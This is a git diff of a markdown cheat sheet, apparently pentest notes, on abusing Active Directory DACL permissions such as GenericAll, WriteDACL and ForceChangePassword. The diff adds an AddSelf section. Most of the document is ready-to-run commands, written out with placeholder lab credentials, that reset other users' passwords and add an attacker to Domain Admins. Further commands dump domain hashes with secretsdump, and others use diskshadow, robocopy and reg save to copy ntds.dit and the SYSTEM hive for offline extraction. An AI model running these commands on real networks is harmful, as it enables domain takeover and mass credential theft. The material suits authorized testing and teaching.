@@ -1,6 +1,6 @@
 # Discretionary Access Control List abuses
 
-## GenericAll
+## **GenericAll**
 ### Description: The attacker has full control over the object.
 ### Exploit:
 Modify the target user’s attributes.
@@ -8,7 +8,7 @@ Replace their servicePrincipalName (SPN) for Kerberoasting.
 Reset their password directly.
 ### Tool Example: PowerView, Set-DomainUserPassword
 ---
-## GenericWrite
+## **GenericWrite**
 ### Description: The attacker can write some properties of the object.
 ### Exploit:
 Add msDS-AllowedToActOnBehalfOfOtherIdentity (for RBCD).
@@ -44,7 +44,7 @@ Become the owner of an object → modify DACL to give themselves GenericAll.
     getnthash.py -key <minikerberos key from gettgtokinit.py> domail.local/target_user
     ```
 ---
-## WriteDACL
+## **WriteDACL**
 ### Description: Permission to modify the DACL itself.
 ### Exploit:
 The WriteDacl permission in Active Directory allows users to modify the **Discretionary Access Control List** (**DACL**) of an AD object, giving them the ability to control **object-level** permissions. Consequently, an attacker can write a new **Access Control Entry** (**ACE**) to the target object’s DACL, potentially gaining full control over the target object.
@@ -81,36 +81,36 @@ The WriteDacl permission in Active Directory allows users to modify the **Discre
         Set-DomainUserPassword -Identity 'target_us' -AccountPassword $NewPassword
         ``
 ---
-## Self-Membership / Add Member to Group
+## **Self-Membership / Add Member to Group**
 ### Description: If an attacker has WriteProperty on a group object.
 ### Exploit:
 Add themselves to privileged groups (e.g., Domain Admins).
 ### Tool Example: Add-DomainGroupMember, net group
 ---
-## Resource-Based Constrained Delegation (RBCD)
+## **Resource-Based Constrained Delegation (RBCD)**
 ### Description: Abuse when attacker controls a machine account and has GenericWrite or WriteProperty over a target computer account.
 ### Exploit:
 Configure RBCD to impersonate a privileged user to the computer.
 Combine with S4U2Self and S4U2Proxy ticket attacks.
 ### Tool Example: Rubeus, PowerMad, Impacket
 ---
-## SIDHistory Injection (when combined with DACL misconfigs)
+## **SIDHistory Injection (when combined with DACL misconfigs)**
 ### Description: Add a SID of a privileged group (e.g., Domain Admins) to a user’s SIDHistory.
 ### Exploit:
 Often requires admin on the DC or replication rights.
 Tool Example: mimikatz, Golden Ticket, DCShadow
 
-## ForceChangePassword
+## **ForceChangePassword**
 ### Description
  - If a user has ForceChangePassword dacl over another user/svc account, he can change Force Change their Password, Pretty obvious Right! 😂
 ### Exploit
- - we can use LINUX ->  `net rpc` , `Bloody-AD` , `impacket-changepasswd` 
+ - we can use LINUX ->  `net rpc` , `BloodyAD` , `impacket-changepasswd` 
  - Windows -> `Powerview.ps1` , `mimikatz` 
 1. **`net rpc`**
    ```bash
    net rpc password target_user 'Password@987' -U domain.local/myuser%'Password@1' -S 192.168.1.48
    ```
-2. **`Bloody-AD`**
+2. **`BloodyAD`**
    ```bash
    bloodyAD --host "192.168.1.48" -d "domain.local" -u "myuser" -p 'myPassword@1' set password "target" 'newPassword@987'
    ```
@@ -128,4 +128,64 @@ Tool Example: mimikatz, Golden Ticket, DCShadow
 5. **`mimikatz`**
    ```bash
    lsadump::setntlm /server:domain.local /user:new_user /password:Password@9876
+   ```
+
+## **AddSelf**
+### Description
+attackers can escalate privileges by adding themselves to privileged groups like Domain Admins or Backup Operators. As a result, they gain administrative control, move laterally within the network, access sensitive systems, and maintain persistence. in Addition user can later perform kerberoasting 
+### Exploit
+1. **`net rpc`**
+    ```bash
+    net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
+    ```
+2. **`pth-net`**
+    ```bash
+    pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
+    ```
+    - To verify 
+       ```bash
+        net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
+       ```
+3. **`BloodyAD`**
+   ```bash
+   bloodyAD --host "192.168.1.48" -d "DOMAIN.DOM" -u "our-user" -p "Password@1" add groupMember "target group" "our-user"
+   ```
+4. **`Powerview`**
+   ```powershell
+    powershell -ep bypass
+    Import-Module .PowerView.ps1
+    Add-DomainGroupMember -Identity "Domain Admins" -Members "our-user" -Verbose
+   ```
+
+#### If we ended up in a *Domain Admin* Group just dump the domain hashes
+```bash
+impacket-secretsdump 'ignite.local'/'shreya':'Password@1'@'192.168.1.48'
+```
+#### If we landed in a Backup Operator Group we can dump the hashes from ntds.dit
+1. Create a `.dsh` file (distributed shell)
+   ```dsh
+    set context persistent nowriters
+    add volume c: alias obad
+    create
+    expose %obad% z:
+   ```
+2. use `unix2dos` to make it windows compatible format
+   ```bash
+   unix2dos obad.dsh
+   ```
+3. upload it and on the target machine execute this 
+   ```powershell
+   diskshadow /s obad.dsh
+   ```
+4. get the `ntds.dit` into a Temp dir
+   ```powershell
+   robocopy /b z:windowsntds . ntds.dit
+   ```
+5. save the SYSTEM registry hive
+   ```powershell
+   reg save hklm\system C:\Temp\system
+   ```
+6. Download both and uste `impacket-secretdump` to do the job
+   ```bash
+   impacket-secretsdump -ntds ntds.dit -system system local
    ```
